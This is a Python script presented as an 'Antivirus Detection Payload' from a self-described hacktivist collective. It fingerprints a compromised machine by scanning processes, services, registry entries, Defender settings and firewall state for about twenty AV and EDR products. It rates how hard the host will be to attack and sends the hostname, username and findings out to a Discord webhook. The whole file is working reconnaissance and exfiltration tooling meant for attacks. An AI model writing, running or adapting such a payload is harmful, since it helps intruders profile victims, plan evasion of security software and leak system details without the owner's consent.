#!/usr/bin/env python3
"""
Antivirus Detection Payload
Detects installed antivirus software and security products
⚡ EchoDead - Hacktivist Collective
"""

import os
import sys
import platform
import subprocess
from datetime import datetime

# Add parent directory to path
sys.path.insert(0, os.path.dirname(__file__))
try:
    from webhook_utils import send_to_discord
    WEBHOOK_AVAILABLE = True
except ImportError:
    WEBHOOK_AVAILABLE = False

# Known AV/EDR products and their indicators
AV_SIGNATURES = {
    'Windows Defender': ['MsMpEng.exe', 'MpCmdRun.exe', 'NisSrv.exe'],
    'Norton': ['Norton', 'N360.exe', 'NortonSecurity.exe'],
    'McAfee': ['McAfee', 'McShield.exe', 'mfevtps.exe'],
    'Kaspersky': ['Kaspersky', 'avp.exe', 'avpui.exe'],
    'Bitdefender': ['Bitdefender', 'bdagent.exe', 'vsserv.exe'],
    'Avast': ['Avast', 'AvastSvc.exe', 'AvastUI.exe'],
    'AVG': ['AVG', 'AVGSvc.exe', 'AVGUI.exe'],
    'Malwarebytes': ['Malwarebytes', 'mbamservice.exe'],
    'Sophos': ['Sophos', 'SavService.exe', 'ALsvc.exe'],
    'ESET': ['ESET', 'ekrn.exe', 'egui.exe'],
    'Trend Micro': ['Trend Micro', 'TMBMSRV.exe', 'PccNTMon.exe'],
    'F-Secure': ['F-Secure', 'fshoster32.exe'],
    'Webroot': ['Webroot', 'WRSA.exe'],
    'Comodo': ['Comodo', 'cfp.exe', 'cmdagent.exe'],
    'CrowdStrike Falcon': ['CrowdStrike', 'CSFalconService.exe', 'CSFalconContainer.exe'],
    'Carbon Black': ['Carbon Black', 'cb.exe', 'CbDefense'],
    'SentinelOne': ['SentinelOne', 'SentinelAgent.exe'],
    'Cylance': ['Cylance', 'CylanceSvc.exe'],
    'FireEye': ['FireEye', 'xagt.exe'],
    'Palo Alto Traps': ['Traps', 'cyserver.exe'],
}

def get_running_processes():
    """Get list of running processes"""
    processes = []
    
    try:
        if platform.system() == "Windows":
            result = subprocess.run(
                'tasklist',
                shell=True,
                capture_output=True,
                text=True
            )
            
            if result.returncode == 0:
                for line in result.stdout.splitlines()[3:]:  # Skip header
                    parts = line.split()
                    if parts:
                        processes.append(parts[0])
        else:
            result = subprocess.run(
                'ps aux',
                shell=True,
                capture_output=True,
                text=True
            )
            
            if result.returncode == 0:
                for line in result.stdout.splitlines()[1:]:  # Skip header
                    parts = line.split()
                    if len(parts) > 10:
                        processes.append(parts[10])
    
    except Exception as e:
        print(f"⚠️  Error getting processes: {e}")
    
    return processes

def detect_av_by_processes(processes):
    """Detect AV products by running processes"""
    detected = {}
    
    processes_lower = [p.lower() for p in processes]
    
    for av_name, indicators in AV_SIGNATURES.items():
        for indicator in indicators:
            if any(indicator.lower() in p for p in processes_lower):
                if av_name not in detected:
                    detected[av_name] = []
                detected[av_name].append(indicator)
                break
    
    return detected

def check_windows_defender():
    """Specific check for Windows Defender status"""
    if platform.system() != "Windows":
        return None
    
    try:
        # Check if Windows Defender is running
        result = subprocess.run(
            'powershell -Command "Get-MpComputerStatus"',
            shell=True,
            capture_output=True,
            text=True,
            timeout=5
        )
        
        if result.returncode == 0:
            status = {}
            for line in result.stdout.splitlines():
                if ':' in line:
                    key, value = line.split(':', 1)
                    key = key.strip()
                    value = value.strip()
                    
                    if key in ['AntivirusEnabled', 'RealTimeProtectionEnabled', 'IoavProtectionEnabled']:
                        status[key] = value
            
            return status
    except Exception as e:
        pass
    
    return None

def check_installed_software():
    """Check installed software for AV products (Windows)"""
    installed_av = []
    
    if platform.system() != "Windows":
        return installed_av
    
    try:
        # Check installed programs via registry
        result = subprocess.run(
            r'reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall /s',
            shell=True,
            capture_output=True,
            text=True,
            timeout=10
        )
        
        if result.returncode == 0:
            for av_name in AV_SIGNATURES.keys():
                if av_name.lower() in result.stdout.lower():
                    installed_av.append(av_name)
    except:
        pass
    
    return installed_av

def check_services():
    """Check running services for AV indicators (Windows)"""
    av_services = []
    
    if platform.system() != "Windows":
        return av_services
    
    try:
        result = subprocess.run(
            'sc query type= service state= all',
            shell=True,
            capture_output=True,
            text=True,
            timeout=10
        )
        
        if result.returncode == 0:
            for av_name, indicators in AV_SIGNATURES.items():
                for indicator in indicators:
                    if indicator.lower() in result.stdout.lower():
                        av_services.append(av_name)
                        break
    except:
        pass
    
    return av_services

def check_firewall_status():
    """Check Windows Firewall status"""
    if platform.system() != "Windows":
        return None
    
    try:
        result = subprocess.run(
            'netsh advfirewall show allprofiles state',
            shell=True,
            capture_output=True,
            text=True,
            timeout=5
        )
        
        if result.returncode == 0:
            return 'ON' if 'ON' in result.stdout else 'OFF'
    except:
        pass
    
    return None

def main():
    print("=" * 70)
    print("ANTIVIRUS DETECTION PAYLOAD")
    print("=" * 70)
    print(f"\nExecution Time: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
    print(f"Platform: {platform.system()} {platform.release()}")
    print(f"Hostname: {platform.node()}")
    print(f"User: {os.getlogin() if hasattr(os, 'getlogin') else os.getenv('USER', 'Unknown')}\n")
    
    # Get running processes
    print("🔍 Scanning running processes...")
    processes = get_running_processes()
    print(f"   Found {len(processes)} running processes\n")
    
    # Detect AV by processes
    print("=" * 70)
    print("DETECTED SECURITY PRODUCTS")
    print("=" * 70 + "\n")
    
    detected_av = detect_av_by_processes(processes)
    
    if detected_av:
        print(f"🚨 Detected {len(detected_av)} security product(s):\n")
        for av_name, indicators in detected_av.items():
            print(f"  ⚠️  {av_name}")
            print(f"      Indicators: {', '.join(indicators)}\n")
    else:
        print("✅ No known AV/EDR products detected by process scan\n")
    
    # Check Windows Defender specifically
    if platform.system() == "Windows":
        print("=" * 70)
        print("WINDOWS DEFENDER STATUS")
        print("=" * 70 + "\n")
        
        defender_status = check_windows_defender()
        
        if defender_status:
            print("🛡️  Windows Defender Configuration:")
            for key, value in defender_status.items():
                status_icon = "✅" if value == "True" else "❌"
                print(f"  {status_icon} {key}: {value}")
            print()
        else:
            print("ℹ️  Could not retrieve Windows Defender status\n")
        
        # Check firewall
        print("=" * 70)
        print("WINDOWS FIREWALL")
        print("=" * 70 + "\n")
        
        firewall_status = check_firewall_status()
        if firewall_status:
            status_icon = "🔥" if firewall_status == "ON" else "❌"
            print(f"{status_icon} Windows Firewall: {firewall_status}\n")
        
        # Check installed software
        print("=" * 70)
        print("INSTALLED SECURITY SOFTWARE")
        print("=" * 70 + "\n")
        
        print("🔍 Checking installed programs...")
        installed_av = check_installed_software()
        
        if installed_av:
            print(f"\n📦 Found {len(installed_av)} security products installed:")
            for av in installed_av:
                print(f"  • {av}")
            print()
        else:
            print("ℹ️  No additional AV products found via registry\n")
        
        # Check services
        print("=" * 70)
        print("SECURITY SERVICES")
        print("=" * 70 + "\n")
        
        print("🔍 Checking running services...")
        av_services = check_services()
        
        if av_services:
            print(f"\n🔧 Found {len(set(av_services))} security services:")
            for service in set(av_services):
                print(f"  • {service}")
            print()
        else:
            print("ℹ️  No security services detected\n")
    
    # Summary
    print("=" * 70)
    print("SUMMARY")
    print("=" * 70)
    
    summary = {
        "Platform": f"{platform.system()} {platform.release()}",
        "Hostname": platform.node(),
        "User": os.getlogin() if hasattr(os, 'getlogin') else os.getenv('USER', 'Unknown'),
        "Detected AV Products": len(detected_av),
        "Total Processes": len(processes),
        "Timestamp": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
    }
    
    if detected_av:
        summary["AV List"] = ", ".join(detected_av.keys())
    
    if platform.system() == "Windows":
        if defender_status:
            summary["Windows Defender"] = "Enabled" if defender_status.get('AntivirusEnabled') == 'True' else "Disabled"
        if firewall_status:
            summary["Firewall"] = firewall_status
    
    for key, value in summary.items():
        print(f"{key}: {value}")
    
    # Risk assessment
    risk_level = "🟢 LOW"
    if len(detected_av) == 0:
        risk_level = "🟢 LOW - No AV detected"
    elif len(detected_av) == 1 and 'Windows Defender' in detected_av:
        risk_level = "🟡 MEDIUM - Basic protection"
    elif any(edr in str(detected_av) for edr in ['CrowdStrike', 'Carbon Black', 'SentinelOne', 'Cylance']):
        risk_level = "🔴 HIGH - EDR detected"
    else:
        risk_level = "🟡 MEDIUM - Consumer AV"
    
    print(f"\n🎯 Security Posture: {risk_level}")
    
    # Send to Discord
    if WEBHOOK_AVAILABLE:
        print("\n📤 Sending report to Discord...")
        
        discord_report = summary.copy()
        discord_report["Security Posture"] = risk_level
        
        if send_to_discord("🛡️  Antivirus Detection Report", discord_report):
            print("✅ Report sent successfully!")
        else:
            print("⚠️  Discord webhook not configured")
    else:
        print("\n⚠️  Webhook module not available")
    
    print("\n✅ Antivirus detection complete!")

if __name__ == "__main__":
    main()
